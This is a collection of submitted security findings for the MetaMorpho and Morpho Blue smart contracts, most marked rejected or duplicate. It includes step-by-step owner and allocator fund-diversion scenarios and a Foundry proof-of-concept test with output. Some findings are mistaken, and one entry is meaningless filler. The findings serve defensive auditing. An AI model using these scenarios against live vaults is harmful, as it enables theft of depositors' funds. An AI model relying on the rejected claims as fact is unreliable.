For the `ERC4626` vault, it's recommended to send the first min liquidity LP tokens to the zero
address to enable share dilution when the vault has `0` totalSupply. There are many more security checks you can add, please refer to https://mixbytes.io/blog/overview-of-the-inflation-attack 



### Fees taken on user deposits if market is reactivated	_(duplicate of [User will be paying duplicate fees])_

**Severity:** High risk

**Context:** [MetaMorpho.sol#L509-L509](metamorpho/src/MetaMorpho.sol#L509-L509)

**Description**: Markets can be removed even if assets are still supplied to it (see `updateWithdrawQueue`). This will lead to a drop in `totalAssets()` as the market is removed from the `withdrawQueue`. Adding this market back, by setting a non-zero supply cap, will add it back to the `withdrawQueue` and increase the `totalAssets` again.
This increase in `totalAssets` leads to the fee recipient taking fees on it the next time `_accrueFee()` is called. They are essentially taking fees on user deposits and stealing from users in this case. Users will lose their funds.
This can happen accidentally or deliberately by the `owner`. The owner can set an account under their control as the fee recipient, optionally increase the fee (none of this requires a time-lock so far), force-fully disable a market by `submitMarketRemoval`, wait for the timelock to pass, then add the market back and all user funds that haven't been withdrawn for that market will be taxed the fee percentage. They can repeat this to fully drain all user funds. Note that the `owner` should not have permission to steal user funds, see the roles in the README.

**Recommendation**: When a market is added back in `_setCap`, the `lastTotalAssets` variable needs to be set to the new total assets. Fees need to be accrued prior to setting this variable. This way, the fee on the user principal won't be applied the next time fees are accrued.



### Removing Market From `withdrawQueue` Could Result In Regular User Losses	_(this issue has been rejected)_

**Severity:** High risk

**Context:** _(No context files were provided by the reviewer)_

- Summary 
In [metamorpho vaults](https://github.com/morpho-org/metamorpho/blob/main/src/MetaMorpho.sol) the current logic to remove a market from `withdrawable` queue, there are a couple of conditions:
```solidity
if (config[id].cap != 0) revert ErrorsLib.InvalidMarketRemovalNonZeroCap(id);

                if (MORPHO.supplyShares(id, address(this)) != 0) {
                    if (config[id].removableAt == 0) revert ErrorsLib.InvalidMarketRemovalNonZeroSupply(id);

                    if (block.timestamp < config[id].removableAt) {
                        revert ErrorsLib.InvalidMarketRemovalTimelockNotElapsed(id);
                    }
                }
```
We check whether a storage variables, which could be changed, without actually withdrawing funds from Morpho to verify if it is safe to delete a config.

- Details
The flow, which could lead to stuck and lost funds for the protocol and users is as follows:
- Users [deposit](https://github.com/morpho-org/metamorpho/blob/303271ebb30fe88dedbeeff7c1d624b9cee63509/src/MetaMorpho.sol#L559) funds to market A.
- A guardian decides to [remove](https://github.com/morpho-org/metamorpho/blob/303271ebb30fe88dedbeeff7c1d624b9cee63509/src/MetaMorpho.sol#L308) a market and waits for the timelock to pass.
- All users have [withdrawn](https://github.com/morpho-org/metamorpho/blob/303271ebb30fe88dedbeeff7c1d624b9cee63509/src/MetaMorpho.sol#L585) their funds, except for one actor (It can be a malicious actor or a regular user who hasn't noticed the removal request).
- The timelock has passed, and now an allocator [updates](https://github.com/morpho-org/metamorpho/blob/303271ebb30fe88dedbeeff7c1d624b9cee63509/src/MetaMorpho.sol#L346) the withdraw queue to remove this market.
- All the checks are passing because the market is valid to be removed, no matter that user funds are still deposited there.
- Now the withdraw queue is updated with a new market, which has exactly the same funds as the old one but deposited from another user.
- The user, who hasn't withdrawn his funds from the removed market, calls `withdraw`, or [`redeem`](https://github.com/morpho-org/metamorpho/blob/303271ebb30fe88dedbeeff7c1d624b9cee63509/src/MetaMorpho.sol#L599), which will [withdraw](https://github.com/morpho-org/metamorpho/blob/303271ebb30fe88dedbeeff7c1d624b9cee63509/src/MetaMorpho.sol#L825) the assets deposited into the new market.
- Now if the depositor to the new market, who has no guilt and knowledge about what happened, tries to withdraw his funds, the transaction will revert because in the current withdraw queue there isn't enough liquidity.



- Impact 
The result impact is temporary stuck funds for user, which could be achieved on purpose, or unintentionally

- PoC
Here is a [PoC test](https://gist.github.com/NicolaMirchev/d5199d8d55239086a467e5343e2ea307). Insert it inside `/metamorpho/test/forge/MarketTest.sol` and run `yarn build:blue && FOUNDRY_PROFILE=test forge test --match-test testUpdateWithdrawQueueCanResultInRegUserLoss -vv`
to check the behaviour.

- Recommendation
- I would suggest a mechanism to reallocate the funds when a withdraw queue is being removed, if the balance of the vault for the corresponding market is > 0.
- Another solution is to withdraw the funds in the vault and have a convert function, which will transfer user shares for corresponding funds (But currently this is not a good solution, because anyone can transffer vault token balance to skim recipient)




### Allocator Can Revoke New Market Cap Or Cancel Deposit	_(this issue has been rejected)_

**Severity:** High risk

**Context:** _(No context files were provided by the reviewer)_

- Summary
In [metamorpho vaults](https://github.com/morpho-org/metamorpho/blob/main/src/MetaMorpho.sol) currently the protocol allows allocators to modify the supply and withdraw queues instantly, without and timelock period. The problem arises from the fact that when it is done, there aren't enough checks and this could result in bad behaviour.

- Details 
The problem arises also from the overpowered rights of the allocators, the fact that there is no limit to allocators, and that only one allocator can decide what to do with the queues. Imagine the following scenario:
- There are already multiple supply/withdraw queues, and some users have deposited some funds.
- There is one allocator who doesn't want a given user to deposit in this vault.
- This single allocator has all the rights to call [`setSupplyQueue`](https://github.com/morpho-org/metamorpho/blob/303271ebb30fe88dedbeeff7c1d624b9cee63509/src/MetaMorpho.sol#L325C14-L325C28) with an array of the length `MAX_QUEUE_LENGTH`. Each item in this array is the same market, which has already reached its cap.
- Thus, no user could deposit funds in the vault, even though the cap of all enabled markets isn't reached.
- An allocator could front-run every transaction and can do it over and over again if another allocator is trying to save the vault.

- This would also result in the impossibility to set new caps and markets due to the [check](https://github.com/morpho-org/metamorpho/blob/303271ebb30fe88dedbeeff7c1d624b9cee63509/src/MetaMorpho.sol#L775) inside [`_setCap`](https://github.com/morpho-org/metamorpho/blob/303271ebb30fe88dedbeeff7c1d624b9cee63509/src/MetaMorpho.sol#L766), which is definitely bad behavior, as the protocol is treating one entity as 30 different in this case.

**Impact is:**
- Temporary DoS of deposits
- Allocator executing operations, which should be done only by a guardian (revoking a new marketCap with a workaround)

- PoC
I have create two [PoC tests](https://gist.github.com/NicolaMirchev/31f9496868f68d6bfd7611f62ced3aea) for the different cases.
Plase them inside `/metamorpho/test/forge/MarketTest.sol` and run each of them with:

- `yarn build:blue && FOUNDRY_PROFILE=test forge test --match-test testSingleAllocatorCanFrontrunDepositAndSetCapToRevokeThem -vvv`

- `yarn build:blue && FOUNDRY_PROFILE=test forge test --match-test testSingleAllocatorCanRevokeNewMarketCapBeingAccepted -vvv `

- Recommendation
- My suggestion is to check for duplicates when a new supply queue is set. Maybe the same approach as it is for the the withdraw Queue update



### Incorrect number of shares minted as fee	_(this issue has been rejected)_

**Severity:** High risk

**Context:** _(No context files were provided by the reviewer)_

- Incorrect number of shares minted as fee

- Overview

An incorrect number of shares was minted as fees during fee collection, resulting in a loss of fee.

- Impact

Loss of fee. Fee collection is an integral part of the protocol, thus the loss of fee is critical.

- Proof of Concept

```solidity
    function _accrueFee() internal returns (uint256 newTotalAssets) {
        uint256 feeShares;
        (feeShares, newTotalAssets) = _accruedFeeShares();

        if (feeShares != 0) _mint(feeRecipient, feeShares);

        emit EventsLib.AccrueInterest(newTotalAssets, feeShares);
    }
```

- Assume that the following states:

- The total interest is 100 WETH
- The fee is 30%, so the fees will be 30 WETH.
- totalSupply is 100 shares and totalAssets is 1000 WETH

Let the number of shares to be minted be $feeShares$. The current implementation uses the following formula (simplified) to determine $feeShares$.

$$
\begin{align}
feeShares &= fee \times \frac{totalSupply}{totalAsset} \\
&= 30\ WETH \times \frac{100\ shares}{1000\ WETH} \\
&= 3\ shares
\end{align}
$$

In this case, three (3) shares will be minted to the `feeRecipient` address as the fee is taken.

However, the above formula used in the codebase is incorrect. The total cost/value of the newly-minted shares does not correspond to the fee taken. Immediately after the mint, the value of the three (3) shares is worth only 29.12 WETH, which does not correspond to the 30 WETH fee that the `feeRecipient` address is entitled to.

$$
\begin{align}
value &= 3\ shares \times \frac{1000\ WETH}{100 + 3\ shares} \\
&= 3\ shares \times 9.7087\ WETH\\
&= 29.1262\ WETH
\end{align}
$$

> [!CAUTION]
> Same for [Morpho](https://github.com/morpho-org/morpho-blue/blob/f463e40f776acd0f26d0d380b51cfd02949c8c23/src/Morpho.sol#L486-L488) fee calculation implementation.

- Tools Used

Manual review

- Recommended Mitigation Steps

The correct formula to compute the number of shares minted as fee should be as follows (fee is converted to bps for simplicity):

$$
\begin{align}
feeShares &= \frac{interest \times fee \times totalSupply}{(totalAsset \times WAD) - (fee \times interest) } \\
&= \frac{100\epsilon \times 3000 \times 100\ shares}{(1000\epsilon \times 10000) - (3000 \times 100\epsilon)} \\
&= 3.09278351\ shares
\end{align}
$$

> [!NOTE]  
> The above formula is the same as the one LIDO used [(Link)](https://docs.lido.fi/guides/steth-integration-guide/#fees).

The following is the proof to show that 3.09278351 shares are worth 30 WETH after the mint:

$$
\begin{align}
value &= 3.09278351\ shares \times \frac{1000\ WETH}{100 + 3.09278351\ shares} \\
&= 3.09278351\ shares \times 9.7087\ WETH\\
&= 30\ WETH
\end{align}
$$

Some may argue that it is unfair to use two different formulas for user addresses and fee address. Yet, If the same formula is used, it is not the users who are on the losing end. Instead, it is the protocol team who are on the losing end. An important difference is that when minting the users' shares, the total assets and supply increase because the user deposited 30 WETH. Thus, the value of the share remain constant before and after minting the shares. However, when minting the protocol's share, only the total supply increases.

Value of the 3 shares when users mint:

$$
\begin{align}
value &= 3\ shares \times \frac{1000\ WETH + 30\ WETH}{100 + 3\ shares} \\
&= 3\ shares \times 10\ WETH\\
&= 30\ WETH
\end{align}
$$




### Metamorpho: Donations to the vault's holders can be partially stolen by the owner	_(this issue has been rejected)_

**Severity:** High risk

**Context:** _(No context files were provided by the reviewer)_

**Context:**

https://github.com/morpho-org/metamorpho/blob/main/src/MetaMorpho.sol#L397C2-L446C6

**Description:**

When someone wants to donate some value to a vault without having to trust its owners, the best option is to deposit some funds on a MorphoBlue market on behalf of the vault. Later, the admins of that vault (allocators, curator or owner) can reallocate those donated funds to an enabled market (a market with cap > 0) in order to increase the value of the user's shares. 

The problem is that after the reallocation, the next time interest is accrued in the vault (`_accrueFee()`) this donated funds will be taken as interest so a fee will be applied to them. Therefore, the `feeRecipient` will unfairly receive a fee for those funds that were meant to be for the vault holders. 



Furthermore, the protocol permits the owner to instantaneously change the fee to as much as 50%. This opens a window for potential exploitation, as outlined in the following steps:

1. 5M DAI are deposited in a market on behalf of a DAI vault. 
2. Vault owner raises the fee to 50%.
3. Vault owner reallocates the 5M DAI to an enabled market.
4. Vault owner resets the fee to its original value:
    - Before changing the fee, interest is accrued with previous fee (`totalInterest = totalAssets() - lastTotalAssets = 5M`)
    - Interest will be 5M so the fee will be 2.5M DAI. 

This process enables the owner to inappropriately divert 50% of the donated funds. Notably, this entire mechanism can be executed in a single transaction, leading to immediate diversion of funds. If the owner actively monitors for donations, they could exploit this vulnerability within the same block as the donation, resulting in instant theft. 

**Recommendation:**

To rectify this vulnerability, it is recommended that donated funds should be excluded from being counted as interest. Instead, they should be directly added to `lastTotalAssets`. This adjustment can be made in the `reallocate()` function. Below is a suggested code modification to mitigate this issue:

```diff
function reallocate(MarketAllocation[] calldata allocations) external onlyAllocatorRole {
    uint256 totalSupplied;
    uint256 totalWithdrawn;
    
+   _updateLastTotalAssets(_accrueFee()); // Take fee for interest accrued until this point

    for (uint256 i; i < allocations.length; ++i) {
        // ...
    }
    
+   _updateLastTotalAssets(totalAssets()); // Add donated assets to `lastTotalAssets`

    if (totalWithdrawn != totalSupplied) revert ErrorsLib.InconsistentReallocation();
}
```



### Reward's distribution design can cause claimers to lose monetary value because restrictions to claim rewards	_(this issue has been rejected)_

**Severity:** High risk

**Context:** _(No context files were provided by the reviewer)_

- Impact
- Users can lose assets when repaying loans in the Morpho Blue markets through the MorphoBundler because the unspent assets are not transferred back to the caller


- Proof of Concept
- When users use the MorphoBundler to [supply](https://cantina.xyz/ai/8409a0ce-6c21-4cc9-8ef2-bd77ce7425af/morpho-blue-bundlers/src/MorphoBundler.sol#L90), [repay](https://cantina.xyz/ai/8409a0ce-6c21-4cc9-8ef2-bd77ce7425af/morpho-blue-bundlers/src/MorphoBundler.sol#L174), or [liquidate](https://cantina.xyz/ai/8409a0ce-6c21-4cc9-8ef2-bd77ce7425af/morpho-blue-bundlers/src/MorphoBundler.sol#L244), they can do these operations by specifying either an amount of assets or amount of shares that they'd like to supply/repay/liquidate in a Morpho Blue Market. When the user specifies a number of assets, the number of shares must be 0, otherwise, it will revert in the Morpho Blue market, the same applies vice-versa, when the user specifies the number of shares, the number of assets must be 0.
- The assets that are gonna be pulled from the Morpho Blue market must have already been transferred into the Bundler, the problem is when the users are specifying shares, the amount of assets that will need to be transferred from the bundler is not an exact amount that can be known in advance, so, the users need to transfer X amount of assets into the Bundler, from where the Market will pull Y amount of assets to cover the required amount of assets based on the specified amount of shares. The problem is that the difference between the number of assets that the user deposited into the Bundler and the actual amount of assets that were pulled from the Bundler are not returned to the user at the end of the execution, thus, these assets can be lost and left in the Bundler contract.

> MorphoBundler.sol
```solidity
    function morphoRepay(
        ...
    ) external payable protected {
        ...
        (uint256 repaidAssets, uint256 repaidShares) = MORPHO.repay(marketParams, assets, shares, onBehalf, data);

        if (assets > 0) require(repaidShares >= slippageAmount, ErrorsLib.SLIPPAGE_EXCEEDED);
        else require(repaidAssets <= slippageAmount, ErrorsLib.SLIPPAGE_EXCEEDED);

        //@audit-issue => If the user specified an amount of shares to operate, the unspent amount of loanTokens is not returned to the initiator!
        //@audit-issue => The unspent tokens could be left on the bundler contract
    }

```

- Tools Used
Manual Audit

- Recommended Mitigation Steps
- The suggested mitigation to prevent this from happening is to at the end of the function execution, call the TransferBundler::erc20Transfer() and pass `type(uint256).max` as the value of the amount to be transferred, in this way, any unspent loanToken in the Bundler contract will be sent back to the caller.
```solidity
    function morphoRepay(
        MarketParams calldata marketParams,
        uint256 assets,
        uint256 shares,
        uint256 slippageAmount,
        address onBehalf,
        bytes calldata data
    ) external payable protected {
       ...

        (uint256 repaidAssets, uint256 repaidShares) = MORPHO.repay(marketParams, assets, shares, onBehalf, data);


        if (assets > 0) require(repaidShares >= slippageAmount, ErrorsLib.SLIPPAGE_EXCEEDED);
-       else require(repaidAssets <= slippageAmount, ErrorsLib.SLIPPAGE_EXCEEDED);
+       else {
+         require(repaidAssets <= slippageAmount, ErrorsLib.SLIPPAGE_EXCEEDED);
          //@audit-info => When repaying shares, return any unspent loanToken to the initiator!
+         erc20Transfer(marketParams.loanToken, initiator(), type(uint256).max);
+       }

    }
```



### фдгхдфгх

**Severity:** High risk

**Context:** _(No context files were provided by the reviewer)_

ддфгхйг



### Incorrect rewards distribution causes claimers to not being able to claim their full reward assigned in new roots	_(this issue has been rejected)_

**Severity:** High risk

**Context:** _(No context files were provided by the reviewer)_

- Impact
The rewards assigned to claimers who have already claimed a reward won't be able to be fully claimed because incorrectly computing the amount of tokens that are transferred to the claimer, instead of sending the full awards that were assigned in each new root, it will only send the difference between the past claimed reward and the current existing reward, this means that for each new root where an existing claimer is assigned new rewards, it will be able to claim fewer rewards.
- As an example, if UserA is awarded for the first time a total of 500 reward tokens, on this occasion, UserA will be able to claim his full assigned reward. In the next period, UserA is assigned a total of 2k reward tokens, but, because of an incorrect implementation in the distribution logic, instead of being able to claim the 2k tokens that were assigned as his reward for the new period, UserA will be able only to claim 1500 tokens. (Will dive deep into the code and provide a runnable PoC to demonstrate this issue in the section below).


- Proof of Concept
Users can claim their rewards by calling the [`UniversalRewardsDistributor::claim()` function](https://cantina.xyz/ai/8409a0ce-6c21-4cc9-8ef2-bd77ce7425af/universal-rewards-distributor/src/UniversalRewardsDistributor.sol#L115), which is in charge of validating that the provided proof alongside the rest of the parameters are indeed valid parameters and represents a real leaf of the Merkle tree, which is nothing more than the data of the account that is trying to claim its rewards. If the provided parameters are valid, the function executes some logic that intends to prevent users from claiming their rewards more than once and computes (in a wrong way) the total amount of rewards to send to the account.

- The problem with the existing logic is that the past claimed amount affects the amount that is sent to the user in the current period, in example, if the user last claimed was 500 reward tokens, and in the current period has been awarded to claim 2k reward tokens, the existing logic deducts from the current claimable amount the total amount of claimed tokens from the last claim, this means, the contract will only send 1.5k reward tokens to the user, instead of sending the whole 2k reward tokens that was awarded. Let's do a code walk-through to spot where this issue occurs.

> UniversalRewardsDistributor.sol
```solidity
function claim(address account, address reward, uint256 claimable, bytes32[] calldata proof)
    external
    returns (uint256 amount)
{
    require(root != bytes32(0), ErrorsLib.ROOT_NOT_SET);

    //@audit-info => Validates the provided proof and parameters represent a valid leaf of the current root
    require(
        MerkleProof.verifyCalldata(
            proof, root, keccak256(bytes.concat(keccak256(abi.encode(account, reward, claimable))))
        ),
        ErrorsLib.INVALID_PROOF_OR_EXPIRED
    );

    //@audit-info => The below logic attempts to prevent users from claiming multiple times their rewards in the same period
    require(claimable > claimed[account][reward], ErrorsLib.CLAIMABLE_TOO_LOW);

    //@audit-issue => The problem is caused in the next two lines of code.

    //@audit-issue => The amount of tokens that are sent to the user is computed by deducting the current amount that was assigned to the user to be claimed minus the last claimed amount (see below comment)
    amount = claimable - claimed[account][reward];

    //@audit-issue => The amount assigned to the user to be claimed is stored in this mapping. This means, that when the user claims again in the future, this mapping will be assigned a value, it won't be 0. Thus, it will cause that in the next claim, the amount of tokens to be sent will be affected by this value.
    claimed[account][reward] = claimable;

    //@audit-issue => Instead of sending the exact amount that was awarded to the user, the actual amount of reward tokens that are sent to the user is the value computed for the `amount` variable, which is the result of subtracting the exact awarded amount minus the last claimed amount.
    ERC20(reward).safeTransfer(account, amount);

    emit EventsLib.Claimed(account, reward, amount);
}
```

- Below is a runnable PoC that demonstrates the example given in the Impact section.

- Coded PoC
In this PoC we are demonstrating how users receive fewer rewards than the rewards they were assigned to if they have already claimed a reward in a previous period.

- The PoC basically simulates a scenario where 2 users are awarded for the first time and they claim their assigned rewards correctly, in this period each user is awarded 500 reward tokens, and then, in the next period, a new user is also awarded, the assigned rewards to each user this time is 2k reward tokens. The result will be that User1 and User2 are not able to claim their full rewards, they only receive 1.5k reward tokens, whilst the new user can receive his full rewards.

- Help me to add the below changes to the [`UniversalRewardsDistributorTest file`](https://cantina.xyz/ai/8409a0ce-6c21-4cc9-8ef2-bd77ce7425af/universal-rewards-distributor/test/UniversalRewardsDistributorTest.sol).

> UniversalRewardsDistributorTest.sol
```solidity

...
...
...
+ import "../lib/forge-std/src/console2.sol";

contract UniversalRewardsDistributorTest is Test {

  //@audit => Make sure to add all the below code!

  function testClaimPoC(uint256 claimable) public {
    claimable = bound(claimable, 1 ether, 1000 ether);
    {
        //@audit-info => First period of rewards!
        (bytes32[] memory data, bytes32 root) = _setupRewardsPoC(claimable, 4);
        vm.prank(owner);
        distributionWithoutTimeLock.setRoot(root, DEFAULT_IPFS_HASH);
        assertEq(distributionWithoutTimeLock.root(), root);

        bytes32[] memory proof1 = merkle.getProof(data, 0);
        bytes32[] memory proof2 = merkle.getProof(data, 1);

        console2.log("Claiming User1 in the first period, was awarded 500, should claim 500");
        uint256 claimed1 = distributionWithoutTimeLock.claim(vm.addr(1), address(token1), claimable/2, proof1);
        console2.log("User1 in the first period was able to claim: ", claimed1);
        assertEq(claimed1, claimable/2);
        console2.log("=====================================");

        uint256 claimed2 = distributionWithoutTimeLock.claim(vm.addr(1), address(token2), claimable/2, proof2);
        assertEq(claimed2, claimable/2);

        bytes32[] memory proof3 = merkle.getProof(data, 2);
        bytes32[] memory proof4 = merkle.getProof(data, 3);

        console2.log("Claiming User2 in the first period, was awarded 500, should claim 500");
        uint256 claimed3 = distributionWithoutTimeLock.claim(vm.addr(2), address(token1), claimable/2, proof3);
        console2.log("User1 in the first period was able to claim: ", claimed3);
        assertEq(claimed3, claimable/2);
        console2.log("=====================================");

        uint256 claimed4 = distributionWithoutTimeLock.claim(vm.addr(2), address(token2), claimable/2, proof4);
        assertEq(claimed4, claimable/2);

    }

    {
        //@audit-info => second period of rewards!
        uint256 claimable2 = claimable * 2;

        (bytes32[] memory data2, bytes32 root2) = _setupRewardsNewUserPoC(claimable2, 6);
        vm.prank(owner);
        distributionWithoutTimeLock.setRoot(root2, DEFAULT_IPFS_HASH);
        assertEq(distributionWithoutTimeLock.root(), root2);

        //@audit-issue => For existing claimers, the actual claimed amount will be less because it will deduct the last claim
        bytes32[] memory proof2_1 = merkle.getProof(data2, 0);
        // bytes32[] memory proof2_2 = merkle.getProof(data2, 1);

        console2.log("Claiming User1 in the second period, was awarded 2k, should claim 2k");
        uint256 claimed2_1 = distributionWithoutTimeLock.claim(vm.addr(1), address(token1), claimable2, proof2_1);
        console2.log("User1 in the second period was able to claim: ", claimed2_1);
        assertEq(claimed2_1, claimable2);
        console2.log("=====================================");

        // uint256 claimed2_2 = distributionWithoutTimeLock.claim(vm.addr(1), address(token2), expectedClaimed2, proof2_2);

        bytes32[] memory proof2_3 = merkle.getProof(data2, 2);
        // bytes32[] memory proof2_4 = merkle.getProof(data2, 3);

        console2.log("Claiming User2 in the second period, was awarded 2k, should claim 2k");
        uint256 claimed2_3 = distributionWithoutTimeLock.claim(vm.addr(2), address(token1), claimable2, proof2_3);
        console2.log("User2 in the second period was able to claim: ", claimed2_3);
        assertEq(claimed2_3, claimable2);
        console2.log("=====================================");

        // uint256 claimed2_4 = distributionWithoutTimeLock.claim(vm.addr(2), address(token2), expectedClaimed2, proof2_4);

        //@audit-ok => For new users works fine, and allows to claim the whole amount!
        bytes32[] memory proof2_5 = merkle.getProof(data2, 4);
        bytes32[] memory proof2_6 = merkle.getProof(data2, 5);

        console2.log("Claiming User3 in the second period, was awarded 2k, should claim 2k");
        uint256 claimed2_5 = distributionWithoutTimeLock.claim(vm.addr(3), address(token1), claimable2, proof2_5);
        console2.log("User3 in the second period was able to claim: ", claimed2_5);
        assertEq(claimed2_5, claimable2);
        console2.log("=====================================");

        uint256 claimed2_6 = distributionWithoutTimeLock.claim(vm.addr(3), address(token2), claimable2, proof2_6);
        assertEq(claimed2_6, claimable2);

    }
  }

  function _setupRewardsPoC(uint256 claimable, uint256 size)
      internal
      view
      returns (bytes32[] memory data, bytes32 root)
  {
      data = new bytes32[](size);

      //@audit-info => Rewards for user1
      data[0] = keccak256(
          bytes.concat(keccak256(abi.encode(vm.addr(1), address(token1), uint256(claimable / 2))))
      );
      data[1] = keccak256(
          bytes.concat(keccak256(abi.encode(vm.addr(1), address(token2), uint256(claimable / 2))))
      );

      //@audit-info => Rewards for user2
      data[2] = keccak256(
          bytes.concat(keccak256(abi.encode(vm.addr(2), address(token1), uint256(claimable / 2))))
      );
      data[3] = keccak256(
          bytes.concat(keccak256(abi.encode(vm.addr(2), address(token2), uint256(claimable / 2))))
      );

      root = merkle.getRoot(data);
  }

  function _setupRewardsNewUserPoC(uint256 claimable, uint256 size)
      internal
      view
      returns (bytes32[] memory data, bytes32 root)
  {
      data = new bytes32[](size);

      //@audit-info => Rewards for user1
      data[0] = keccak256(
          bytes.concat(keccak256(abi.encode(vm.addr(1), address(token1), uint256(claimable))))
      );
      data[1] = keccak256(
          bytes.concat(keccak256(abi.encode(vm.addr(1), address(token2), uint256(claimable))))
      );

      //@audit-info => Rewards for user2
      data[2] = keccak256(
          bytes.concat(keccak256(abi.encode(vm.addr(2), address(token1), uint256(claimable))))
      );
      data[3] = keccak256(
          bytes.concat(keccak256(abi.encode(vm.addr(2), address(token2), uint256(claimable))))
      );

      //@audit-info => Rewards for user3 (The new user)
      data[4] = keccak256(
          bytes.concat(keccak256(abi.encode(vm.addr(3), address(token1), uint256(claimable))))
      );
      data[5] = keccak256(
          bytes.concat(keccak256(abi.encode(vm.addr(3), address(token2), uint256(claimable))))
      );

      root = merkle.getRoot(data);
  }

}
```

- To execute the PoC, run the below command, the expected output is similar to this:
> forge test --match-test testClaimPoC -vv
```
macias96@MSI:/mnt/c/pr0/Auditor_Contests/Cantina/Metamorpho/universal-rewards-distributor$ forge test --match-test testClaimPoC -vv
[⠰] Compiling...
[⠆] Compiling 4 files with 0.8.19
[⠰] Solc 0.8.19 finished in 1.82s
Compiler run successful!

Running 1 test for test/UniversalRewardsDistributorTest.sol:UniversalRewardsDistributorTest
[FAIL. Reason: Assertion failed. Counterexample: calldata=0x0x1ee6ecd40000000000000000000000000000000000000000000000000000000000000000, args=[0]] testClaimPoC(uint256) (runs: 0, μ: 0, ~: 0)
Logs:
  Bound Result 1000000000000000000
  Claiming User1 in the first period, was awarded 500, should claim 500
  User1 in the first period was able to claim:  500000000000000000
  =====================================
  Claiming User2 in the first period, was awarded 500, should claim 500
  User1 in the first period was able to claim:  500000000000000000
  =====================================
  Claiming User1 in the second period, was awarded 2k, should claim 2k
  User1 in the second period was able to claim:  1500000000000000000
  Error: a == b not satisfied [uint]
        Left: 1500000000000000000
       Right: 2000000000000000000
  =====================================
  Claiming User2 in the second period, was awarded 2k, should claim 2k
  User2 in the second period was able to claim:  1500000000000000000
  Error: a == b not satisfied [uint]
        Left: 1500000000000000000
       Right: 2000000000000000000
  =====================================
  Claiming User3 in the second period, was awarded 2k, should claim 2k
  User3 in the second period was able to claim:  2000000000000000000
  =====================================

Test result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 276.16ms

Ran 1 test suites: 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/UniversalRewardsDistributorTest.sol:UniversalRewardsDistributorTest
[FAIL. Reason: Assertion failed. Counterexample: calldata=0x0x1ee6ecd40000000000000000000000000000000000000000000000000000000000000000, args=[0]] testClaimPoC(uint256) (runs: 0, μ: 0, ~: 0)
```


- Tools Used
Manual Audit

- Recommended Mitigation Steps
- The recommendation to mitigate this issue it is to send the full amount of rewards that are awarded to the users in each claiming period, and do not discount previous claims from the current claiming. Do the below changes to the code

> [`UniversalRewardsDistributor contract`](https://cantina.xyz/ai/8409a0ce-6c21-4cc9-8ef2-bd77ce7425af/universal-rewards-distributor/src/UniversalRewardsDistributor.sol)
```solidity
    function claim(address account, address reward, uint256 claimable, bytes32[] calldata proof)
        external
-       returns (uint256 amount)
+       returns (uint256)
    {
        require(root != bytes32(0), ErrorsLib.ROOT_NOT_SET);
        require(
            MerkleProof.verifyCalldata(
                proof, root, keccak256(bytes.concat(keccak256(abi.encode(account, reward, claimable))))
            ),
            ErrorsLib.INVALID_PROOF_OR_EXPIRED
        );

        require(claimable > claimed[account][reward], ErrorsLib.CLAIMABLE_TOO_LOW);

-       amount = claimable - claimed[account][reward];

        claimed[account][reward] = claimable;

-       ERC20(reward).safeTransfer(account, amount);
        //@audit-info => Make sure to transfer the full claimable amount of the current period to the user
+       ERC20(reward).safeTransfer(account, claimable);

-       emit EventsLib.Claimed(account, reward, amount);
+       emit EventsLib.Claimed(account, reward, claimable);

+       return claimable;

    }
```



### Early user that deposit to the vault can withdraw more than what he entitled in Metamorpho.sol	_(this issue has been rejected)_

**Severity:** High risk

**Context:** [MetaMorpho.sol#L823-L826](metamorpho/src/MetaMorpho.sol#L823-L826)

**Description**

In Metamorpho.sol is a ERC4626 vault

with modification

when user deposit fund

depends on the supply queue market params

the fund goes to morpho blue lending market to generate yield

```solidity
function _supplyMorpho(uint256 assets) internal {
	for (uint256 i; i < supplyQueue.length; ++i) {
		Id id = supplyQueue[i];

		uint256 supplyCap = config[id].cap;
		if (supplyCap == 0) continue;

		MarketParams memory marketParams = _marketParams(id);
		(uint256 supplyAssets,,) = _accruedSupplyBalance(marketParams, id);

		uint256 toSupply = UtilsLib.min(supplyCap.zeroFloorSub(supplyAssets), assets);

		if (toSupply > 0) {
			// Using try/catch to skip markets that revert.
			try MORPHO.supply(marketParams, toSupply, 0, address(this), hex"") {
				assets -= toSupply;
			} catch {}
		}

		if (assets == 0) return;
	}
```

when wihdraw, depends on the withdraw queue setting, share is burnt and asset can be withdraw

```solidity
    function _withdrawMorpho(uint256 assets) internal {
        for (uint256 i; i < withdrawQueue.length; ++i) {
            Id id = withdrawQueue[i];
            MarketParams memory marketParams = _marketParams(id);
            (uint256 supplyAssets,, Market memory market) = _accruedSupplyBalance(marketParams, id);

            uint256 toWithdraw = UtilsLib.min(
                _withdrawable(marketParams, market.totalSupplyAssets, market.totalBorrowAssets, supplyAssets), assets
            );

            if (toWithdraw > 0) {
                // Using try/catch to skip markets that revert.
                try MORPHO.withdraw(marketParams, toWithdraw, 0, address(this), address(this)) {
                    assets -= toWithdraw;
                } catch {}
            }

            if (assets == 0) return;
        }
```

where is the problem?

the problem is that when the withdraw queue is updated (withdraw queue is increased)

user can deposit fund for one market to mint share and then withdraw fund from two market depends on the withdraw queue setting

consider the case

1. admin add supply queue lending market with asset USDC
2. admin add withdraw queue lending market with asset USDC
3. user deposit USDC and mint shares
4. admin update the supply queue lending market with USDC (market 1) and another USDC market with different interest rate (market 2)
5. admin update the withdraw queue lending market with asset USDC (market 1) and another USDC market with different interest rate (market 2)
6. user burn share that he deposit for USDC market1 and specify high withdrawal amount to withdraw fund from both lending market (market 1 and market 2)

as we can see, the user never deposit the fund into USDC lending protocol market 2 yet he withdraw fund from USDC lending protocol, clearly lose of fund

**Recommendation**

emm I think the easy way to fix the issue  it should be safe to make sure the length of both supply queue and withdraw queue length is one 

and protocol should deploy multiple instance of metamoporpho 



###  implementation leads to wrong calculating assets or shares 	_(this issue has been rejected)_

**Severity:** High risk

**Context:** [MetaMorpho.sol#L579-L579](metamorpho/src/MetaMorpho.sol#L579-L579)

after accrue fee , fee shares are minting to fee recipient and _totalSupply is modified ,However here when calculating assets based on shares , totalSupply () is taking into account to calculate how much assets will be receive .Acutally _totatSupply of ERC 20  is modified when minting shares to fee recipient , But not totalSupply() . TotalSupply()  will only show shares that are existing  shares . 
pls use _totalSupply in deposit , mint , redeem and withdraw 



### Malicious liquidators can poison all markets with bad debt that will never be socialized	_(this issue has been rejected)_

**Severity:** High risk

**Context:** _(No context files were provided by the reviewer)_

**Description**:
When liquidating a user, when his collateral is equal to 0, then and only then can his bad debt be socialized to the suppliers.

